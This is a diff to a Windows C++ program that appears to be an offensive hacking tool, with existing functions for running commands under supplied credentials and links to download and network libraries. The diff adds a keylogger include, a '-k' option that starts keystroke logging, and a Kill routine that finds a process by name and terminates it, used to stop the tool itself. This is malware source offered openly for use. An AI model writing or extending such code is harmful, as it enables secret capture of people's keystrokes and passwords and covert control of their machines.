@@ -1,4 +1,5 @@
 #include "stdafx.h"
+#include"Keylogger.h"
 #include <WinSock2.h>
 #include <Windows.h>
 #include <urlmon.h>
@@ -8,7 +9,7 @@
 #include <stdio.h>
 #include <stdexcept>
 #include <string>
-
+#include<TlHelp32.h>
 #pragma comment(lib,"urlmon.lib")
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "netapi32.lib")
@@ -261,6 +262,41 @@ int runcmd(wchar_t* username,wchar_t*password, wchar_t*cmdexe) {
 	}
 }
 
+int Kill(LPCTSTR strProcessName) {
+	HANDLE handle32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	if (INVALID_HANDLE_VALUE == handle32Snapshot)
+	{
+		return FALSE;
+	}
+	PROCESSENTRY32 pEntry;
+	pEntry.dwSize = sizeof(PROCESSENTRY32);
+	//Search for all the process and terminate it
+	if (Process32First(handle32Snapshot, &pEntry))
+	{
+		BOOL bFound = FALSE;
+		if (!_tcsicmp(pEntry.szExeFile, strProcessName))
+		{
+			bFound = TRUE;
+		}
+		while ((!bFound) && Process32Next(handle32Snapshot, &pEntry))
+		{
+			if (!_tcsicmp(pEntry.szExeFile, strProcessName))
+			{
+				bFound = TRUE;
+			}
+		}
+		if (bFound)
+		{
+			CloseHandle(handle32Snapshot);
+			HANDLE handLe = OpenProcess(PROCESS_TERMINATE, FALSE, pEntry.th32ProcessID);
+			BOOL bResult = TerminateProcess(handLe, 0);
+			return bResult;
+		}
+	}
+	CloseHandle(handle32Snapshot);
+	return false;
+}
 
 int main(int argc, char* argv[])
 {
@@ -350,6 +386,18 @@ int main(int argc, char* argv[])
 			exit(1);
 		}
 		runcmd(c2wc(argv[2]), c2wc(argv[3]), c2wc(argv[4]));
+	}
+	else if(strcmp(argv[1],"-k")==0)
+	{
+		if ((argv[2] == NULL) == true)
+		{
+			cout << "start Keylogger" << endl;
+			Keylogger();
+		}
+		else if (strcmp(argv[2],"-s")==0)
+		{
+			Kill(argv[0]);
+		}
 	}
 	else
 	{
